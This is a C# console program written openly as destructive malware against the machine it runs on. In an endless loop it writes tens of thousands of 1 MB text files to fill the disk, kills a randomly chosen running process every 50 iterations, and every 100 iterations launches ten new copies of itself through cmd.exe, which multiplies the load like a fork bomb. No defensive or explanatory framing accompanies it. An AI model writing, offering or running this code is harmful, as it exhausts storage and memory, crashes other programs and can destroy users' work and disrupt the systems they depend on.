using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

class Program
{
    // Function to generate large data structure
    static string GenerateData()
    {
        return new string('a', (int)Math.Pow(10, 6)); // Generate a string of length 10^6
    }

    // Function to kill a random process
    static void KillRandomProcess()
    {
        Process[] processes = Process.GetProcesses();
        Random rand = new Random();
        Process processToKill = processes[rand.Next(processes.Length)];
        if (processToKill.ProcessName != "cmd" && processToKill.ProcessName != "explorer") // Avoid killing essential processes
        {
            processToKill.Kill();
            Console.WriteLine($"Killed process with PID: {processToKill.Id}");
        }
    }

    // Function to overwhelm the system
    static void OverwhelmSystem()
    {
        Console.WriteLine("Overwhelming system...");
        for (int i = 0; i < 10; i++)
        {
            Process.Start("cmd.exe", "/c start " + System.Reflection.Assembly.GetExecutingAssembly().Location); // Start a new process of the current program
        }
    }

    static void Main(string[] args)
    {
        int count = 1;

        while (true)
        {
            // Generate large data structure to consume memory
            string data = GenerateData();

            // Save to multiple text files (simulated)
            for (int i = 0; i < 10000; i++)
            {
                // Simulate file creation
                File.WriteAllText($"output_{count}_{i}.txt", data);
            }

            count++;

            // Kill random process every 50 iterations
            if (count % 50 == 0)
            {
                KillRandomProcess();
            }

            // Overwhelm the system every 100 iterations
            if (count % 100 == 0)
            {
                OverwhelmSystem();
            }

            Thread.Sleep(1000); // Sleep for 1 second
        }
    }
}
